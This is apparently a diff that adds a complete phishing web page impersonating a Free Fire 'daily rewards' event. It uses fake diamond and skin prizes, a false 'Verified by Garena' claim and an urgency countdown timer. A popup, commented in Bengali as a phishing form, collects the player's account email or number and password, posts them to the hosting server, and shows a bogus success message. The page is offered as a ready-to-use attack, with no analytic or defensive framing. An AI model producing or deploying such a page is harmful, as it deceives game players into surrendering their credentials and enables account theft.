@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Free Fire Daily Rewards - Claim Now!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0f1e;
+            font-family: 'Segoe UI', 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .reward-container {
+            max-width: 500px;
+            width: 100%;
+            background: linear-gradient(145deg, #1a1f2e, #0e1220);
+            border-radius: 48px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 215, 0, 0.1);
+            overflow: hidden;
+            backdrop-filter: blur(4px);
+        }
+
+        .reward-header {
+            background: linear-gradient(135deg, #ffb347, #ff7e05);
+            padding: 24px 20px;
+            text-align: center;
+        }
+
+        .reward-header h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #fff;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            letter-spacing: 1px;
+        }
+
+        .reward-header p {
+            color: #fff4e0;
+            font-weight: 500;
+            margin-top: 8px;
+            font-size: 0.9rem;
+        }
+
+        .reward-badge {
+            background: gold;
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 40px;
+            color: #1e2a3a;
+            font-weight: bold;
+            margin-top: 12px;
+            font-size: 0.8rem;
+            box-shadow: 0 0 15px rgba(255,215,0,0.6);
+        }
+
+        .countdown-area {
+            background: #0b0e18;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #2a3246;
+        }
+
+        .countdown-title {
+            color: #ffaa44;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-family: monospace;
+        }
+
+        .timer-box {
+            background: #00000066;
+            border-radius: 20px;
+            padding: 8px 12px;
+            min-width: 70px;
+            backdrop-filter: blur(4px);
+        }
+
+        .timer-number {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #ffcc66;
+            line-height: 1;
+        }
+
+        .timer-label {
+            font-size: 0.7rem;
+            color: #aaa;
+            text-transform: uppercase;
+        }
+
+        .reward-items {
+            padding: 25px 20px;
+            background: #0f1322;
+        }
+
+        .reward-item {
+            display: flex;
+            align-items: center;
+            background: rgba(0,0,0,0.3);
+            border-radius: 60px;
+            padding: 12px 18px;
+            margin-bottom: 16px;
+            border: 1px solid #2a3246;
+            transition: 0.2s;
+        }
+
+        .reward-icon {
+            font-size: 2.2rem;
+            margin-right: 16px;
+        }
+
+        .reward-info {
+            flex: 1;
+        }
+
+        .reward-name {
+            font-weight: bold;
+            color: #ffdd99;
+        }
+
+        .reward-desc {
+            font-size: 0.7rem;
+            color: #aaa;
+        }
+
+        .reward-value {
+            font-weight: bold;
+            color: #ffb347;
+            background: #1e1a2a;
+            padding: 6px 12px;
+            border-radius: 50px;
+        }
+
+        .claim-btn {
+            background: linear-gradient(95deg, #ff7e05, #ffb347);
+            border: none;
+            width: calc(100% - 40px);
+            margin: 0 20px 30px 20px;
+            padding: 16px;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            color: #1e1a2a;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 5px 15px rgba(255,125,0,0.4);
+        }
+
+        .claim-btn:hover {
+            transform: scale(0.98);
+            background: linear-gradient(95deg, #ff9933, #ffcc66);
+        }
+
+        .form-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .form-card {
+            background: #11161f;
+            border-radius: 48px;
+            max-width: 380px;
+            width: 90%;
+            padding: 32px 24px;
+            border: 1px solid #ffb347;
+            box-shadow: 0 25px 40px rgba(0,0,0,0.6);
+            text-align: center;
+        }
+
+        .form-card h3 {
+            color: #ffb347;
+            margin-bottom: 20px;
+        }
+
+        .form-card input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border-radius: 60px;
+            border: none;
+            background: #1e2a3a;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .form-card button {
+            background: #ffb347;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 60px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .close-form {
+            background: #4a2c2c;
+            margin-top: 10px;
+        }
+
+        .result-message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+        }
+
+        .success {
+            background: #2e7d32;
+            color: white;
+        }
+
+        .error {
+            background: #c62828;
+            color: white;
+        }
+
+        .footer-note {
+            text-align: center;
+            padding: 16px;
+            font-size: 0.7rem;
+            color: #6a7a9e;
+            border-top: 1px solid #2a3246;
+        }
+    </style>
+</head>
+<body>
+
+<div class="reward-container" id="rewardContainer">
+    <div class="reward-header">
+        <h1>🔥 FREE FIRE REWARDS 🔥</h1>
+        <p>Limited time event — claim your daily bonus!</p>
+        <div class="reward-badge">⭐ OFFICIAL GIFT ⭐</div>
+    </div>
+
+    <div class="countdown-area">
+        <div class="countdown-title">⏳ OFFER ENDS IN</div>
+        <div class="countdown-timer" id="countdown">
+            <div class="timer-box"><span class="timer-number" id="hours">02</span><div class="timer-label">Hours</div></div>
+            <div class="timer-box"><span class="timer-number" id="minutes">15</span><div class="timer-label">Mins</div></div>
+            <div class="timer-box"><span class="timer-number" id="seconds">00</span><div class="timer-label">Secs</div></div>
+        </div>
+    </div>
+
+    <div class="reward-items">
+        <div class="reward-item">
+            <div class="reward-icon">💎</div>
+            <div class="reward-info">
+                <div class="reward-name">Diamonds</div>
+                <div class="reward-desc">Premium currency</div>
+            </div>
+            <div class="reward-value">+5000 💎</div>
+        </div>
+        <div class="reward-item">
+            <div class="reward-icon">🎭</div>
+            <div class="reward-info">
+                <div class="reward-name">Legendary Skin</div>
+                <div class="reward-desc">"Night Phantom" set</div>
+            </div>
+            <div class="reward-value">FREE</div>
+        </div>
+        <div class="reward-item">
+            <div class="reward-icon">🎫</div>
+            <div class="reward-info">
+                <div class="reward-name">Weirdo Crate</div>
+                <div class="reward-desc">10x Premium crates</div>
+            </div>
+            <div class="reward-value">LIMITED</div>
+        </div>
+    </div>
+
+    <button class="claim-btn" id="claimBtn">🎁 CLAIM REWARD NOW 🎁</button>
+    <div class="footer-note">✔️ Verified by Garena • Only for today</div>
+</div>
+
+<!-- ফিশিং ফর্ম পপআপ -->
+<div id="phishForm" class="form-popup">
+    <div class="form-card">
+        <h3>🔐 Login to Claim</h3>
+        <p style="color:#aaa; font-size:0.8rem;">Verify your Free Fire account to receive rewards</p>
+        <form id="freefireForm">
+            <input type="text" id="ff_username" name="username" placeholder="Number/Email" required autocomplete="off">
+            <input type="password" id="ff_password" name="password" placeholder="Password" required autocomplete="off">
+            <button type="submit" id="submitClaim">CONFIRM & CLAIM</button>
+            <button type="button" id="closeFormBtn" class="close-form">Cancel</button>
+        </form>
+        <div id="formMessage" style="margin-top: 12px;"></div>
+    </div>
+</div>
+
+<script>
+    // কাউন্টডাউন টাইমার (2 ঘন্টা 15 মিনিট)
+    let endTime = new Date().getTime() + (2 * 60 * 60 * 1000) + (15 * 60 * 1000);
+    const countdownInterval = setInterval(() => {
+        const now = new Date().getTime();
+        const distance = endTime - now;
+        if (distance < 0) {
+            clearInterval(countdownInterval);
+            document.getElementById('hours').innerText = "00";
+            document.getElementById('minutes').innerText = "00";
+            document.getElementById('seconds').innerText = "00";
+            return;
+        }
+        const hours = Math.floor((distance % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
+        const minutes = Math.floor((distance % (60 * 60 * 1000)) / (60 * 1000));
+        const seconds = Math.floor((distance % (60 * 1000)) / 1000);
+        document.getElementById('hours').innerText = hours.toString().padStart(2,'0');
+        document.getElementById('minutes').innerText = minutes.toString().padStart(2,'0');
+        document.getElementById('seconds').innerText = seconds.toString().padStart(2,'0');
+    }, 1000);
+
+    // Popup elements
+    const claimBtn = document.getElementById('claimBtn');
+    const phishFormDiv = document.getElementById('phishForm');
+    const closeBtn = document.getElementById('closeFormBtn');
+    const freefireForm = document.getElementById('freefireForm');
+    const usernameInput = document.getElementById('ff_username');
+    const passwordInput = document.getElementById('ff_password');
+    const submitBtn = document.getElementById('submitClaim');
+    const formMessage = document.getElementById('formMessage');
+
+    claimBtn.onclick = () => {
+        phishFormDiv.style.display = 'flex';
+        formMessage.innerHTML = ''; // clear previous message
+    };
+    closeBtn.onclick = () => {
+        phishFormDiv.style.display = 'none';
+    };
+    window.onclick = (e) => {
+        if (e.target === phishFormDiv) phishFormDiv.style.display = 'none';
+    };
+
+    // Handle form submission with fetch (no page reload, no redirect)
+    freefireForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!username || !password) {
+            showFormMessage('⚠️ Please fill both fields.', 'error');
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Processing...';
+
+        try {
+            const response = await fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({ username: username, password: password })
+            });
+            const data = await response.json();
+            if (data.status === 'success') {
+                showFormMessage('✅ Success! Your reward will be credited within 24 hours.', 'success');
+                usernameInput.value = '';
+                passwordInput.value = '';
+                // Automatically close popup after 2 seconds
+                setTimeout(() => {
+                    phishFormDiv.style.display = 'none';
+                    formMessage.innerHTML = '';
+                }, 2000);
+            } else {
+                showFormMessage('❌ Something went wrong. Please try again.', 'error');
+            }
+        } catch (err) {
+            showFormMessage('❌ Network error. Please try again.', 'error');
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'CONFIRM & CLAIM';
+        }
+    });
+
+    function showFormMessage(msg, type) {
+        formMessage.innerHTML = `<div class="result-message ${type === 'success' ? 'success' : 'error'}">${msg}</div>`;
+        setTimeout(() => {
+            if (formMessage.innerHTML.includes(msg)) formMessage.innerHTML = '';
+        }, 5000);
+    }
+</script>
+
+</body>
+</html>
